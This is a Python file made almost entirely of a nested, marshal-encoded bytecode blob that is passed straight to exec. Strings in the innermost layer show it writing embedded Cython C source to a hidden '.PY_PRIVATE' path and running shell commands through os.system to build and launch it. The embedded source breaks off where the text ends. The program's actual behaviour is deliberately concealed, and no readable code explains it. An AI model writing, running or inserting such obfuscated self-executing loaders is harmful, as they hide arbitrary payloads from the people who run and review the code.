import marshal
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s*\x00\x00\x00d\x00Z\x00e\x00r\x10f\x02d\x03tnZ\x03d\x02d\x03l\x02Z\x02e\x03e\x02\xa0\x04d\x04\xa1\x01\x83\x01\x01\x00d\x03S\x00)\x05F\xe9\x01\x00\x00\x00\xe9\x00\x00\x00\x00Ns\x0e\xf9\x05\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s*\x00\x00\x00d\x00Z\x00e\x00r\x10f\x02d\x03tnZ\x03d\x02d\x03l\x02Z\x02e\x03e\x02\xa0\x04d\x04\xa1\x01\x83\x01\x01\x00d\x03S\x00)\x05F\xe9\x01\x00\x00\x00\xe9\x00\x00\x00\x00Nsh\xf8\x05\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s*\x00\x00\x00d\x00Z\x00e\x00r\x10f\x02d\x03tnZ\x03d\x02d\x03l\x02Z\x02e\x03e\x02\xa0\x04d\x04\xa1\x01\x83\x01\x01\x00d\x03S\x00)\x05F\xe9\x01\x00\x00\x00\xe9\x00\x00\x00\x00Ns\xc2\xf7\x05\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s*\x00\x00\x00d\x00Z\x00e\x00r\x10f\x02d\x03tnZ\x03d\x02d\x03l\x02Z\x02e\x03e\x02\xa0\x04d\x04\xa1\x01\x83\x01\x01\x00d\x03S\x00)\x05F\xe9\x01\x00\x00\x00\xe9\x00\x00\x00\x00Ns\x1c\xf7\x05\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s*\x00\x00\x00d\x00Z\x00e\x00r\x10f\x02d\x03tnZ\x03d\x02d\x03l\x02Z\x02e\x03e\x02\xa0\x04d\x04\xa1\x01\x83\x01\x01\x00d\x03S\x00)\x05F\xe9\x01\x00\x00\x00\xe9\x00\x00\x00\x00Nsv\xf6\x05\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s*\x00\x00\x00d\x00Z\x00e\x00r\x10f\x02d\x03tnZ\x03d\x02d\x03l\x02Z\x02e\x03e\x02\xa0\x04d\x04\xa1\x01\x83\x01\x01\x00d\x03S\x00)\x05F\xe9\x01\x00\x00\x00\xe9\x00\x00\x00\x00Ns\xd0\xf5\x05\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s*\x00\x00\x00d\x00Z\x00e\x00r\x10f\x02d\x03tnZ\x03d\x02d\x03l\x02Z\x02e\x03e\x02\xa0\x04d\x04\xa1\x01\x83\x01\x01\x00d\x03S\x00)\x05F\xe9\x01\x00\x00\x00\xe9\x00\x00\x00\x00Ns*\xf5\x05\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s*\x00\x00\x00d\x00Z\x00e\x00r\x10f\x02d\x03tnZ\x03d\x02d\x03l\x02Z\x02e\x03e\x02\xa0\x04d\x04\xa1\x01\x83\x01\x01\x00d\x03S\x00)\x05F\xe9\x01\x00\x00\x00\xe9\x00\x00\x00\x00Ns\x84\xf4\x05\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s*\x00\x00\x00d\x00Z\x00e\x00r\x10f\x02d\x03tnZ\x03d\x02d\x03l\x02Z\x02e\x03e\x02\xa0\x04d\x04\xa1\x01\x83\x01\x01\x00d\x03S\x00)\x05F\xe9\x01\x00\x00\x00\xe9\x00\x00\x00\x00Ns\xde\xf3\x05\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s*\x00\x00\x00d\x00Z\x00e\x00r\x10f\x02d\x03tnZ\x03d\x02d\x03l\x02Z\x02e\x03e\x02\xa0\x04d\x04\xa1\x01\x83\x01\x01\x00d\x03S\x00)\x05F\xe9\x01\x00\x00\x00\xe9\x00\x00\x00\x00Ns8\xf3\x05\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s*\x00\x00\x00d\x00Z\x00e\x00r\x10f\x02d\x03tnZ\x03d\x02d\x03l\x02Z\x02e\x03e\x02\xa0\x04d\x04\xa1\x01\x83\x01\x01\x00d\x03S\x00)\x05F\xe9\x01\x00\x00\x00\xe9\x00\x00\x00\x00Ns\x92\xf2\x05\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s*\x00\x00\x00d\x00Z\x00e\x00r\x10f\x02d\x03tnZ\x03d\x02d\x03l\x02Z\x02e\x03e\x02\xa0\x04d\x04\xa1\x01\x83\x01\x01\x00d\x03S\x00)\x05F\xe9\x01\x00\x00\x00\xe9\x00\x00\x00\x00Ns\xec\xf1\x05\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s*\x00\x00\x00d\x00Z\x00e\x00r\x10f\x02d\x03tnZ\x03d\x02d\x03l\x02Z\x02e\x03e\x02\xa0\x04d\x04\xa1\x01\x83\x01\x01\x00d\x03S\x00)\x05F\xe9\x01\x00\x00\x00\xe9\x00\x00\x00\x00NsF\xf1\x05\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s*\x00\x00\x00d\x00Z\x00e\x00r\x10f\x02d\x03tnZ\x03d\x02d\x03l\x02Z\x02e\x03e\x02\xa0\x04d\x04\xa1\x01\x83\x01\x01\x00d\x03S\x00)\x05F\xe9\x01\x00\x00\x00\xe9\x00\x00\x00\x00Ns\xa0\xf0\x05\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s*\x00\x00\x00d\x00Z\x00e\x00r\x10f\x02d\x03tnZ\x03d\x02d\x03l\x02Z\x02e\x03e\x02\xa0\x04d\x04\xa1\x01\x83\x01\x01\x00d\x03S\x00)\x05F\xe9\x01\x00\x00\x00\xe9\x00\x00\x00\x00Ns\xfa\xef\x05\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s*\x00\x00\x00d\x00Z\x00e\x00r\x10f\x02d\x03tnZ\x03d\x02d\x03l\x02Z\x02e\x03e\x02\xa0\x04d\x04\xa1\x01\x83\x01\x01\x00d\x03S\x00)\x05F\xe9\x01\x00\x00\x00\xe9\x00\x00\x00\x00NsT\xef\x05\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s*\x00\x00\x00d\x00Z\x00e\x00r\x10f\x02d\x03tnZ\x03d\x02d\x03l\x02Z\x02e\x03e\x02\xa0\x04d\x04\xa1\x01\x83\x01\x01\x00d\x03S\x00)\x05F\xe9\x01\x00\x00\x00\xe9\x00\x00\x00\x00Ns\xae\xee\x05\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s*\x00\x00\x00d\x00Z\x00e\x00r\x10f\x02d\x03tnZ\x03d\x02d\x03l\x02Z\x02e\x03e\x02\xa0\x04d\x04\xa1\x01\x83\x01\x01\x00d\x03S\x00)\x05F\xe9\x01\x00\x00\x00\xe9\x00\x00\x00\x00Ns\x08\xee\x05\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s*\x00\x00\x00d\x00Z\x00e\x00r\x10f\x02d\x03tnZ\x03d\x02d\x03l\x02Z\x02e\x03e\x02\xa0\x04d\x04\xa1\x01\x83\x01\x01\x00d\x03S\x00)\x05F\xe9\x01\x00\x00\x00\xe9\x00\x00\x00\x00Nsb\xed\x05\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00@\x00\x00\x00s^\x01\x00\x00d\x00Z\x00e\x00r\x10f\x02d\x03tnZ\x03d\x02d\x03l\x02Z\x02d\x02d\x03l\x03Z\x03d\x04Z\x04e\x03j\x05Z\x06d\x05e\x06\x17\x00Z\x07d\x06e\x03j\x08\x17\x00Z\td\x07e\x04\x17\x00Z\ne\x02j\x0b\xa0\x0ce\x04\xa1\x01r|e\x02\xa0\rd\x08\xa1\x01\x01\x00e\x02\xa0\re\x07d\t\x17\x00e\t\x17\x00d\t\x17\x00e\n\x17\x00\xa1\x01\x01\x00e\x0ed\x02\x83\x01\x01\x00d\nZ\x0fd\x0bZ\x10d\x0c\xa0\x11e\x03j\x12\xa0\x13d\r\xa1\x01d\x02\x19\x00\xa0\x13d\x0c\xa1\x01d\x03d\x0e\x85\x02\x19\x00\xa1\x01Z\x14d\x0fe\x06\x17\x00d\x10\x17\x00e\x14\x17\x00d\x11\x17\x00e\x04\x17\x00d\r\x17\x00e\x10\x17\x00d\x12\x17\x00e\x06\x17\x00d\x13\x17\x00e\x14\x17\x00Z\x15e\x16e\x10d\x14\x83\x02\x8f\x1aZ\x17e\x17\xa0\x18e\x0f\xa1\x01\x01\x00W\x00d\x03\x04\x00\x04\x00\x83\x03\x01\x00n\x121\x00\x90\x01s\x040\x00\x01\x00\x01\x00\x01\x00Y\x00\x01\x00e\x02j\x19e\x02j\x0b\xa0\x1ae\x04\xa1\x01d\x15d\x16\x8d\x02\x01\x00e\x02\xa0\re\x07d\t\x17\x00e\t\x17\x00d\t\x17\x00e\x15\x17\x00d\t\x17\x00e\n\x17\x00\xa1\x01\x01\x00e\x02\xa0\rd\x08\xa1\x01\x01\x00e\x02\xa0\x1be\x10\xa1\x01\x01\x00d\x03S\x00)\x17F\xe9\x01\x00\x00\x00\xe9\x00\x00\x00\x00Nz\x1a.PY_PRIVATE/17059689270009z\x12export PYTHONHOME=z\x19export PYTHON_EXECUTABLE=z\x02./\xda\x05clearz\x04 && a\r\xe9\x05\x00\n#ifndef PY_SSIZE_T_CLEAN\n#define PY_SSIZE_T_CLEAN\n#endif /* PY_SSIZE_T_CLEAN */\n#if defined(CYTHON_LIMITED_API) && 0\n  #ifndef Py_LIMITED_API\n    #if CYTHON_LIMITED_API+0 > 0x03030000\n      #define Py_LIMITED_API CYTHON_LIMITED_API\n    #else\n      #define Py_LIMITED_API 0x03030000\n    #endif\n  #endif\n#endif\n\n#include "Python.h"\n#ifndef Py_PYTHON_H\n    #error Python headers needed to compile C extensions, please install development version of Python.\n#elif PY_VERSION_HEX < 0x02070000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)\n    #error Cython requires Python 2.7+ or Python 3.3+.\n#else\n#if CYTHON_LIMITED_API\n#define __PYX_EXTRA_ABI_MODULE_NAME "limited"\n#else\n#define __PYX_EXTRA_ABI_MODULE_NAME ""\n#endif\n#define CYTHON_ABI "3_0_3" __PYX_EXTRA_ABI_MODULE_NAME\n#define __PYX_ABI_MODULE_NAME "_cython_" CYTHON_ABI\n#define __PYX_TYPE_MODULE_PREFIX __PYX_ABI_MODULE_NAME "."\n#define CYTHON_HEX_VERSION 0x030003F0\n#define CYTHON_FUTURE_DIVISION 1\n#include <stddef.h>\n#ifndef offsetof\n  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )\n#endif\n#if !defined(_WIN32) && !defined(WIN32) && !defined(MS_WINDOWS)\n  #ifndef __stdcall\n    #define __stdcall\n  #endif\n  #ifndef __cdecl\n    #define __cdecl\n  #endif\n  #ifndef __fastcall\n    #define __fastcall\n  #endif\n#endif\n#ifndef DL_IMPORT\n  #define DL_IMPORT(t) t\n#endif\n#ifndef DL_EXPORT\n  #define DL_EXPORT(t) t\n#endif\n#define __PYX_COMMA ,\n#ifndef HAVE_LONG_LONG\n  #define HAVE_LONG_LONG\n#endif\n#ifndef PY_LONG_LONG\n  #define PY_LONG_LONG LONG_LONG\n#endif\n#ifndef Py_HUGE_VAL\n  #define Py_HUGE_VAL HUGE_VAL\n#endif\n#define __PYX_LIMITED_VERSION_HEX PY_VERSION_HEX\n#if defined(GRAALVM_PYTHON)\n  /* For very preliminary testing purposes. Most variables are set the same as PyPy.\n     The existence of this section does not imply that anything works or is even tested */\n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_LIMITED_API 0\n  #define CYTHON_COMPILING_IN_GRAAL 1\n  #define CYTHON_COMPILING_IN_NOGIL 0\n  #undef CYTHON_USE_TYPE_SLOTS\n  #define CYTHON_USE_TYPE_SLOTS 0\n  #undef CYTHON_USE_TYPE_SPECS\n  #define CYTHON_USE_TYPE_SPECS 0\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #if PY_VERSION_HEX < 0x03050000\n    #undef CYTHON_USE_ASYNC_SLOTS\n    #define CYTHON_USE_ASYNC_SLOTS 0\n  #elif !defined(CYTHON_USE_ASYNC_SLOTS)\n    #define CYTHON_USE_ASYNC_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_INTERNALS\n  #define CYTHON_USE_UNICODE_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_WRITER\n  #define CYTHON_USE_UNICODE_WRITER 0\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE_PYLONG_INTERNALS 0\n  #undef CYTHON_AVOID_BORROWED_REFS\n  #define CYTHON_AVOID_BORROWED_REFS 1\n  #undef CYTHON_ASSUME_SAFE_MACROS\n  #define CYTHON_ASSUME_SAFE_MACROS 0\n  #undef CYTHON_UNPACK_METHODS\n  #define CYTHON_UNPACK_METHODS 0\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_GIL\n  #define CYTHON_FAST_GIL 0\n  #undef CYTHON_METH_FASTCALL\n  #define CYTHON_METH_FASTCALL 0\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #ifndef CYTHON_PEP487_INIT_SUBCLASS\n    #define CYTHON_PEP487_INIT_SUBCLASS (PY_MAJOR_VERSION >= 3)\n  #endif\n  #undef CYTHON_PEP489_MULTI_PHASE_INIT\n  #define CYTHON_PEP489_MULTI_PHASE_INIT 1\n  #undef CYTHON_USE_MODULE_STATE\n  #define CYTHON_USE_MODULE_STATE 0\n  #undef CYTHON_USE_TP_FINALIZE\n  #define CYTHON_USE_TP_FINALIZE 0\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 0\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\n  #endif\n#elif defined(PYPY_VERSION)\n  #define CYTHON_COMPILING_IN_PYPY 1\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_LIMITED_API 0\n  #define CYTHON_COMPILING_IN_GRAAL 0\n  #define CYTHON_COMPILING_IN_NOGIL 0\n  #undef CYTHON_USE_TYPE_SLOTS\n  #define CYTHON_USE_TYPE_SLOTS 0\n  #ifndef CYTHON_USE_TYPE_SPECS\n    #define CYTHON_USE_TYPE_SPECS 0\n  #endif\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #if PY_VERSION_HEX < 0x03050000\n    #undef CYTHON_USE_ASYNC_SLOTS\n    #define CYTHON_USE_ASYNC_SLOTS 0\n  #elif !defined(CYTHON_USE_ASYNC_SLOTS)\n    #define CYTHON_USE_ASYNC_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_INTERNALS\n  #define CYTHON_USE_UNICODE_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_WRITER\n  #define CYTHON_USE_UNICODE_WRITER 0\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE_PYLONG_INTERNALS 0\n  #undef CYTHON_AVOID_BORROWED_REFS\n  #define CYTHON_AVOID_BORROWED_REFS 1\n  #undef CYTHON_ASSUME_SAFE_MACROS\n  #define CYTHON_ASSUME_SAFE_MACROS 0\n  #undef CYTHON_UNPACK_METHODS\n  #define CYTHON_UNPACK_METHODS 0\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_GIL\n  #define CYTHON_FAST_GIL 0\n  #undef CYTHON_METH_FASTCALL\n  #define CYTHON_METH_FASTCALL 0\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #ifndef CYTHON_PEP487_INIT_SUBCLASS\n    #define CYTHON_PEP487_INIT_SUBCLASS (PY_MAJOR_VERSION >= 3)\n  #endif\n  #if PY_VERSION_HEX < 0x03090000\n    #undef CYTHON_PEP489_MULTI_PHASE_INIT\n    #define CYTHON_PEP489_MULTI_PHASE_INIT 0\n  #elif !defined(CYTHON_PEP489_MULTI_PHASE_INIT)\n    #define CYTHON_PEP489_MULTI_PHASE_INIT 1\n  #endif\n  #undef CYTHON_USE_MODULE_STATE\n  #define CYTHON_USE_MODULE_STATE 0\n  #undef CYTHON_USE_TP_FINALIZE\n  #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1 && PYPY_VERSION_NUM >= 0x07030C00)\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 0\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\n  #endif\n#elif defined(CYTHON_LIMITED_API)\n  #ifdef Py_LIMITED_API\n    #undef __PYX_LIMITED_VERSION_HEX\n    #define __PYX_LIMITED_VERSION_HEX Py_LIMITED_API\n  #endif\n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_LIMITED_API 1\n  #define CYTHON_COMPILING_IN_GRAAL 0\n  #define CYTHON_COMPILING_IN_NOGIL 0\n  #undef CYTHON_CLINE_IN_TRACEBACK\n  #define CYTHON_CLINE_IN_TRACEBACK 0\n  #undef CYTHON_USE_TYPE_SLOTS\n  #define CYTHON_USE_TYPE_SLOTS 0\n  #undef CYTHON_USE_TYPE_SPECS\n  #define CYTHON_USE_TYPE_SPECS 1\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #undef CYTHON_USE_ASYNC_SLOTS\n  #define CYTHON_USE_ASYNC_SLOTS 0\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_INTERNALS\n  #define CYTHON_USE_UNICODE_INTERNALS 0\n  #ifndef CYTHON_USE_UNICODE_WRITER\n    #define CYTHON_USE_UNICODE_WRITER 0\n  #endif\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE_PYLONG_INTERNALS 0\n  #ifndef CYTHON_AVOID_BORROWED_REFS\n    #define CYTHON_AVOID_BORROWED_REFS 0\n  #endif\n  #undef CYTHON_ASSUME_SAFE_MACROS\n  #define CYTHON_ASSUME_SAFE_MACROS 0\n  #undef CYTHON_UNPACK_METHODS\n  #define CYTHON_UNPACK_METHODS 0\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_GIL\n  #define CYTHON_FAST_GIL 0\n  #undef CYTHON_METH_FASTCALL\n  #define CYTHON_METH_FASTCALL 0\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #ifndef CYTHON_PEP487_INIT_SUBCLASS\n    #define CYTHON_PEP487_INIT_SUBCLASS 1\n  #endif\n  #undef CYTHON_PEP489_MULTI_PHASE_INIT\n  #define CYTHON_PEP489_MULTI_PHASE_INIT 0\n  #undef CYTHON_USE_MODULE_STATE\n  #define CYTHON_USE_MODULE_STATE 1\n  #ifndef CYTHON_USE_TP_FINALIZE\n    #define CYTHON_USE_TP_FINALIZE 0\n  #endif\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 0\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\n  #endif\n#elif defined(PY_NOGIL)\n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_LIMITED_API 0\n  #define CYTHON_COMPILING_IN_GRAAL 0\n  #define CYTHON_COMPILING_IN_NOGIL 1\n  #ifndef CYTHON_USE_TYPE_SLOTS\n    #define CYTHON_USE_TYPE_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #ifndef CYTHON_USE_ASYNC_SLOTS\n    #define CYTHON_USE_ASYNC_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\n    #define CYTHON_USE_UNICODE_INTERNALS 1\n  #endif\n  #undef CYTHON_USE_UNICODE_WRITER\n  #define CYTHON_USE_UNICODE_WRITER 0\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE_PYLONG_INTERNALS 0\n  #ifndef CYTHON_AVOID_BORROWED_REFS\n    #define CYTHON_AVOID_BORROWED_REFS 0\n  #endif\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\n    #define CYTHON_ASSUME_SAFE_MACROS 1\n  #endif\n  #ifndef CYTHON_UNPACK_METHODS\n    #define CYTHON_UNPACK_METHODS 1\n  #endif\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT\n    #define CYTHON_PEP489_MULTI_PHASE_INIT 1\n  #endif\n  #ifndef CYTHON_USE_TP_FINALIZE\n    #define CYTHON_USE_TP_FINALIZE 1\n  #endif\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 0\n#else\n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_CPYTHON 1\n  #define CYTHON_COMPILING_IN_LIMITED_API 0\n  #define CYTHON_COMPILING_IN_GRAAL 0\n  #define CYTHON_COMPILING_IN_NOGIL 0\n  #ifndef CYTHON_USE_TYPE_SLOTS\n    #define CYTHON_USE_TYPE_SLOTS 1\n  #endif\n  #ifndef CYTHON_USE_TYPE_SPECS\n    #define CYTHON_USE_TYPE_SPECS 0\n  #endif\n  #ifndef CYTHON_USE_PYTYPE_LOOKUP\n    #define CYTHON_USE_PYTYPE_LOOKUP 1\n  #endif\n  #if PY_MAJOR_VERSION < 3\n    #undef CYTHON_USE_ASYNC_SLOTS\n    #define CYTHON_USE_ASYNC_SLOTS 0\n  #elif !defined(CYTHON_USE_ASYNC_SLOTS)\n    #define CYTHON_USE_ASYNC_SLOTS 1\n  #endif\n  #ifndef CYTHON_USE_PYLONG_INTERNALS\n    #define CYTHON_USE_PYLONG_INTERNALS 1\n  #endif\n  #ifndef CYTHON_USE_PYLIST_INTERNALS\n    #define CYTHON_USE_PYLIST_INTERNALS 1\n  #endif\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\n    #define CYTHON_USE_UNICODE_INTERNALS 1\n  #endif\n  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2\n    #undef CYTHON_USE_UNICODE_WRITER\n    #define CYTHON_USE_UNICODE_WRITER 0\n  #elif !defined(CYTHON_USE_UNICODE_WRITER)\n    #define CYTHON_USE_UNICODE_WRITER 1\n  #endif\n  #ifndef CYTHON_AVOID_BORROWED_REFS\n    #define CYTHON_AVOID_BORROWED_REFS 0\n  #endif\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\n    #define CYTHON_ASSUME_SAFE_MACROS 1\n  #endif\n  #ifndef CYTHON_UNPACK_METHODS\n    #define CYTHON_UNPACK_METHODS 1\n  #endif\n  #ifndef CYTHON_FAST_THREAD_STATE\n    #define CYTHON_FAST_THREAD_STATE 1\n  #endif\n  #ifndef CYTHON_FAST_GIL\n    #define CYTHON_FAST_GIL (PY_MAJOR_VERSION < 3 || PY_VERSION_HEX >= 0x03060000 && PY_VERSION_HEX < 0x030C00A6)\n  #endif\n  #ifndef CYTHON_METH_FASTCALL\n    #define CYTHON_METH_FASTCALL (PY_VERSION_HEX >= 0x030700A1)\n  #endif\n  #ifndef CYTHON_FAST_PYCALL\n    #define CYTHON_FAST_PYCALL 1\n  #endif\n  #ifndef CYTHON_PEP487_INIT_SUBCLASS\n    #define CYTHON_PEP487_INIT_SUBCLASS 1\n  #endif\n  #if PY_VERSION_HEX < 0x03050000\n    #undef CYTHON_PEP489_MULTI_PHASE_INIT\n    #define CYTHON_PEP489_MULTI_PHASE_INIT 0\n  #elif !defined(CYTHON_PEP489_MULTI_PHASE_INIT)\n    #define CYTHON_PEP489_MULTI_PHASE_INIT 1\n  #endif\n  #ifndef CYTHON_USE_MODULE_STATE\n    #define CYTHON_USE_MODULE_STATE 0\n  #endif\n  #if PY_VERSION_HEX < 0x030400a1\n    #undef CYTHON_USE_TP_FINALIZE\n    #define CYTHON_USE_TP_FINALIZE 0\n  #elif !defined(CYTHON_USE_TP_FINALIZE)\n    #define CYTHON_USE_TP_FINALIZE 1\n  #endif\n  #if PY_VERSION_HEX < 0x030600B1\n    #undef CYTHON_USE_DICT_VERSIONS\n    #define CYTHON_USE_DICT_VERSIONS 0\n  #elif !defined(CYTHON_USE_DICT_VERSIONS)\n    #define CYTHON_USE_DICT_VERSIONS  (PY_VERSION_HEX < 0x030C00A5)\n  #endif\n  #if PY_VERSION_HEX < 0x030700A3\n    #undef CYTHON_USE_EXC_INFO_STACK\n    #define CYTHON_USE_EXC_INFO_STACK 0\n  #elif !defined(CYTHON_USE_EXC_INFO_STACK)\n    #define CYTHON_USE_EXC_INFO_STACK 1\n  #endif\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1\n  #endif\n#endif\n#if !defined(CYTHON_FAST_PYCCALL)\n#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)\n#endif\n#if !defined(CYTHON_VECTORCALL)\n#define CYTHON_VECTORCALL  (CYTHON_FAST_PYCCALL && PY_VERSION_HEX >= 0x030800B1)\n#endif\n#define CYTHON_BACKPORT_VECTORCALL (CYTHON_METH_FASTCALL && PY_VERSION_HEX < 0x030800B1)\n#if CYTHON_USE_PYLONG_INTERNALS\n  #if PY_MAJOR_VERSION < 3\n    #include "longintrepr.h"\n  #endif\n  #undef SHIFT\n  #undef BASE\n  #undef MASK\n  #ifdef SIZEOF_VOID_P\n    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };\n  #endif\n#endif\n#ifndef __has_attribute\n  #define __has_attribute(x) 0\n#endif\n#ifndef __has_cpp_attribute\n  #define __has_cpp_attribute(x) 0\n#endif\n#ifndef CYTHON_RESTRICT\n  #if defined(__GNUC__)\n    #define CYTHON_RESTRICT __restrict__\n  #elif defined(_MSC_VER) && _MSC_VER >= 1400\n    #define CYTHON_RESTRICT __restrict\n  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\n    #define CYTHON_RESTRICT restrict\n  #else\n    #define CYTHON_RESTRICT\n  #endif\n#endif\n#ifndef CYTHON_UNUSED\n  #if defined(__cplusplus)\n    /* for clang __has_cpp_attribute(maybe_unused) is true even before C++17\n     * but leads to warnings with -pedantic, since it is a C++17 feature */\n    #if ((defined(_MSVC_LANG) && _MSVC_LANG >= 201703L) || __cplusplus >= 